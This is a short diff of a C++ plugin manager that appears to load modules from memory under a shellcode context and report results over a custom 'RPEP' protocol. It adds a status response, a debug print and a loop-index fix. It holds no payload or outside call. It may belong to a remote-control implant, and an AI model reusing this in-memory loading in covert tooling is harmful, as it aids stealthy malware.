@@ -1,4 +1,5 @@
 #include "PluginManager.h"
+#include "RPEP.h"
 #include "plugininterface.h"
 #include "arraylist.h"
 
@@ -126,7 +127,7 @@ void WINAPI FreeLibraryFromMemory(SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module)
     );*/
 }
 
-bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
+bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule,DArray& response){
     DebufPrintf("[pm] loadPlugin \n");
     pgetInterface getInterface;
     //HINSTANCE hModule;
@@ -134,6 +135,8 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
     ulong loadResult;
     PluginManagerInterfacePrivate* pluginPrivate;
     bool result = false;
+	uint loatedPluginID = -1;
+
 
     if(!isPluginLoad((ushort)pluginModule->PluginID)){
         DebufPrintf("Cargando plugin....\n");
@@ -150,6 +153,7 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
             if(getInterface && (newPlugin->plugInterface = getInterface())){
                 DebufPrintf("[pm] getInterface \n");
                 newPlugin->ID = pluginModule->PluginID;
+				DebufPrintf("[pm new plugin: id=%i\n]",newPlugin->ID);
                 pluginPrivate = new PluginManagerInterfacePrivate(*this,*newPlugin);
                 //pluginList = pluginPrivate;
                 pluginList->add(pluginPrivate);
@@ -165,20 +169,23 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
             }
         }
     }else DebufPrintf("ya cargado");
+	protocol->MakeError(response,RPEP_HEADER::Operation::LoadPlugin,result?ERROR_SUCCESS:-1,RPEP_ERROR::level::info,&loatedPluginID,sizeof(loatedPluginID));
 
-    DebufPrintf("Cargado plugin: %s\n",result?"true":"false");
+    DebufPrintf("[pm]Cargado plugin: %s\n",result?"true":"false");
     return result;
 }
 
 plugin* PluginManager::getPluginById(ulong id){
     plugin* result = null;
-    if(pluginList)
+    if(pluginList){
         for (int i = 0; i < pluginList->size(); ++i) {
-            if((*pluginList)[0]->getPlugInformation()->ID == id){
-                result = (*pluginList)[0]->getPlugInformation();
+            if((*pluginList)[i]->getPlugInformation()->ID == id){
+                result = (*pluginList)[i]->getPlugInformation();
                 break;
             }
-    }
+		}
+		DebufPrintf("getPluginById( %i ) = %x, list count %i\n",id,result,pluginList->size());
+	}
     return result;
 }
 
